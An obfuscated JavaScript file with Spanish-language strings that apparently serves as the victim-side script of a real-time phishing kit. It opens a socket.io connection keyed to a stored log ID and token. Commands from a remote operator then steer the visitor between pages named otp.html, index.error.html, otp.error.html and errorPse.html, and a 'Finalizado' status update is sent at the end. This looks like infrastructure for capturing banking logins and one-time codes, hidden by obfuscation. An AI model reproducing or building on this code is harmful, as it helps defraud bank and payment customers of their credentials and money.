function _0x7015(_0x1e8c80, _0x5d970d) {
  const _0x31f9fa = _0x31f9();
  return (
    (_0x7015 = function (_0x7015d6, _0x377115) {
      _0x7015d6 = _0x7015d6 - 0x1ea;
      let _0x115d00 = _0x31f9fa[_0x7015d6];
      return _0x115d00;
    }),
    _0x7015(_0x1e8c80, _0x5d970d)
  );
}
const _0x2766a6 = _0x7015;
(function (_0x3093b8, _0x21a04c) {
  const _0x57aa4c = _0x7015,
    _0x2897ed = _0x3093b8();
  while (!![]) {
    try {
      const _0x17118d =
        (-parseInt(_0x57aa4c(0x211)) / 0x1) *
          (parseInt(_0x57aa4c(0x1fa)) / 0x2) +
        (parseInt(_0x57aa4c(0x214)) / 0x3) *
          (parseInt(_0x57aa4c(0x1f9)) / 0x4) +
        (parseInt(_0x57aa4c(0x20b)) / 0x5) *
          (parseInt(_0x57aa4c(0x1ef)) / 0x6) +
        (-parseInt(_0x57aa4c(0x213)) / 0x7) *
          (parseInt(_0x57aa4c(0x203)) / 0x8) +
        (-parseInt(_0x57aa4c(0x1f2)) / 0x9) *
          (parseInt(_0x57aa4c(0x1f7)) / 0xa) +
        (-parseInt(_0x57aa4c(0x205)) / 0xb) *
          (-parseInt(_0x57aa4c(0x20f)) / 0xc) +
        -parseInt(_0x57aa4c(0x1ec)) / 0xd;
      if (_0x17118d === _0x21a04c) break;
      else _0x2897ed["push"](_0x2897ed["shift"]());
    } catch (_0x54f0c3) {
      _0x2897ed["push"](_0x2897ed["shift"]());
    }
  }
})(_0x31f9, 0xebbfa);
const dataLogId = localStorage[_0x2766a6(0x20a)](_0x2766a6(0x1fb)),
  token = localStorage[_0x2766a6(0x20a)](_0x2766a6(0x1f6));
(!dataLogId || !token) &&
  (console[_0x2766a6(0x208)](_0x2766a6(0x1fd)),
  alert(_0x2766a6(0x20d)),
  (window["location"]["href"] = _0x2766a6(0x206)));
const socket = io(url, { query: { token: token } });
function _0x31f9() {
  const _0x2f160d = [
    "origin",
    "18rjmhEl",
    "connect",
    "Hubo\x20un\x20error\x20al\x20actualizar\x20el\x20estado.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "4203WakxzO",
    "Error\x20en\x20el\x20PUT\x20a\x20updateEndDataLog",
    "./errorPse.html",
    "valor",
    "dataLogToken",
    "1390klDVTA",
    "end",
    "342476MhaIhG",
    "7418CMbEMD",
    "dataLogId",
    "/dataLogs/updateEndDataLog/",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "PUT",
    "log",
    "Datos\x20recibidos:",
    "Bearer\x20",
    "application/json",
    "5744WAmBwk",
    "Error\x20al\x20actualizar\x20el\x20estado:",
    "11ViFUxb",
    "./error.html",
    "Conectado\x20al\x20WebSocket",
    "error",
    "connect_error",
    "getItem",
    "2635635AkEtjk",
    "./otp.html",
    "Hubo\x20un\x20error\x20al\x20cargar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "location",
    "22852620rPDAcZ",
    "href",
    "457wgMciI",
    "json",
    "6671TRdSFN",
    "48PgCoqh",
    "./otp.error.html",
    "ID\x20de\x20dataLog:",
    "message",
    "18796232JnPMFi",
    "./index.error.html",
  ];
  _0x31f9 = function () {
    return _0x2f160d;
  };
  return _0x31f9();
}
socket["on"](_0x2766a6(0x1f0), () =>
  console[_0x2766a6(0x1ff)](_0x2766a6(0x207))
),
  socket["on"](_0x2766a6(0x209), (_0x59c0ef) =>
    console["error"]("Error\x20de\x20conexión:", _0x59c0ef[_0x2766a6(0x1eb)])
  ),
  socket["on"]("data", async (_0x27f36f) => {
    const _0x564408 = _0x2766a6;
    console[_0x564408(0x1ff)](_0x564408(0x200), _0x27f36f),
      console[_0x564408(0x1ff)](_0x564408(0x1ea), dataLogId);
    if (String(_0x27f36f["valid"]) !== String(dataLogId)) return;
    const _0xc48d0f = {
      us: _0x564408(0x1ed),
      din: _0x564408(0x20c),
      new_din: _0x564408(0x215),
      end: _0x564408(0x1f4),
    };
    if (_0x27f36f["valor"] in _0xc48d0f) {
      if (_0x27f36f[_0x564408(0x1f5)] === _0x564408(0x1f8))
        try {
          await updateStatus();
        } catch (_0x470d66) {
          console[_0x564408(0x208)](_0x564408(0x204), _0x470d66),
            alert(_0x564408(0x1f1));
          return;
        }
      window[_0x564408(0x20e)][_0x564408(0x210)] =
        _0xc48d0f[_0x27f36f[_0x564408(0x1f5)]];
    }
  });
async function updateStatus() {
  const _0x3f6154 = _0x2766a6;
  try {
    const _0x46a379 = await fetch(url + _0x3f6154(0x1fc) + dataLogId, {
      method: _0x3f6154(0x1fe),
      headers: {
        "Content-Type": _0x3f6154(0x202),
        Authorization: _0x3f6154(0x201) + token,
        Origin: window[_0x3f6154(0x20e)][_0x3f6154(0x1ee)],
      },
      body: JSON["stringify"]({ status: "Finalizado" }),
    });
    if (!_0x46a379["ok"]) {
      const _0x4a718c = await _0x46a379[_0x3f6154(0x212)]();
      throw new Error(_0x4a718c[_0x3f6154(0x208)] || _0x3f6154(0x1f3));
    }
    console[_0x3f6154(0x1ff)](
      "Estado\x20actualizado\x20correctamente\x20en\x20el\x20servidor."
    );
  } catch (_0x3ca671) {
    throw _0x3ca671;
  }
}
